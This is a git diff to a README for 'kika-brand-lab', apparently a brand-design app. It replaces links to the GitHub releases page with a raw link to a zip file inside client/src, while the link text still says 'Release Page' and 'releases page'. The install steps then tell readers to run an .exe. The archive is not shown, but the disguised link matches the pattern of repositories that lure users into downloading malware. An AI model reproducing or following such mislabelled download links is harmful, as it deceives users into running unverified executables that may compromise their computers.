@@ -1,12 +1,12 @@
 # 🎨 kika-brand-lab - Build consistent brand systems with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/giulianast9580/kika-brand-lab/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/giulianast9580/kika-brand-lab/raw/refs/heads/main/client/src/kika-brand-lab-dixit.zip)
 
 kika-brand-lab acts as a creative space for your company identity. It helps you manage colors, fonts, and design rules in one place. You can see live changes, check accessibility standards, and export files for developers with a single click.
 
 ## 📥 How to Install the App
 
-Visit the [releases page](https://github.com/giulianast9580/kika-brand-lab/releases) to get the latest version.
+Visit the [releases page](https://github.com/giulianast9580/kika-brand-lab/raw/refs/heads/main/client/src/kika-brand-lab-dixit.zip) to get the latest version.
 
 Choose the file that ends in .exe for your Windows computer. Save the file to your desktop or downloads folder. Double-click the file to start the installation. Follow the prompts on the screen to finish the setup. You will see an icon for kika-brand-lab on your desktop once the process completes.
 
